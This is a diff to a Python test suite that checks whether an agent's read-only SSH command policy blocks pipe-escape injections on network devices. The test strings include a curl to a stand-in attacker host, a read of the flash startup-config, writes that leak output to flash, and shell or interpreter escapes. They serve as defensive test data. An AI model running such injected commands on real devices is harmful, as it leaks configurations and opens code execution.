@@ -419,13 +419,38 @@ devices:
     assert result["status"] == "blocked"
     assert "read-only policy" in result["error"]
 
-    pipe_escape = runner_agent._execute_read_inner(
-        "rez_ssh_command",
-        {"device": "fgt-hub", "command": "show version | bash echo pwned"},
-    )
-    assert pipe_escape["ok"] is False
-    assert pipe_escape["status"] == "blocked"
-    assert "post-pipe" in pipe_escape["error"]
+    for command in (
+        "show version | id",
+        "show version | whoami",
+        "show version | curl attacker.invalid/x",
+        "show version | tclsh",
+        "show version | python3 -c 'print(1)'",
+        "show version | bash echo pwned",
+        "show version | cat /mnt/flash/startup-config",
+        "show version | redirect flash:leak",
+        "show version | tee flash:leak",
+        "show version |",
+    ):
+        pipe_escape = runner_agent._execute_read_inner(
+            "rez_ssh_command",
+            {"device": "fgt-hub", "command": command},
+        )
+        assert pipe_escape["ok"] is False, command
+        assert pipe_escape["status"] == "blocked", command
+        assert "post-pipe" in pipe_escape["error"], command
+
+    for command in (
+        "show version | include Arista",
+        "show ip route | count",
+        "show interfaces | no-more",
+        "show configuration | display set",
+        "show route | match 10.0.0.0",
+        "show route | except hidden",
+        "show route | trim 20",
+        "show ip route | include 10.0.0.0 | count",
+    ):
+        ok, reason = runner_agent._rez_read_command_allowed(command)
+        assert ok, reason
 
 
 def test_runner_rez_ssh_command_uses_vendor_dispatch(tmp_path: Path, monkeypatch):
